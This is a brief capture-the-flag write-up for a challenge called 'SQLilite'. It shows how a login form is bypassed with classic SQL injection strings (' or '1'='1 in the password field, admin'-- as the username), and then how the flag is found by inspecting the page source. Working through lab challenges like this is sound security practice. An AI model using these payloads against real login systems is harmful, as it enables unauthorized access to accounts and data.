# SQLilite

![image](../../../Assets/10-1.png)

## identifying the vulnerability

We are welcomed by login form 

![image](../../../Assets/10-5.png)

if we test an invalid credential, we will get an error message

![image](../../../Assets/10-2.png)

## Exploiting the vulnerability

we can use this to do sql injection payload

```
username : admin
password : ' or '1'='1
``` 
or
```
username : admin'--
```

at first we get no flag

![image](../../../Assets/10-3.png)

we can get the flag by doing inspect element on the page and search for the flag

![image](../../../Assets/10-4.png)
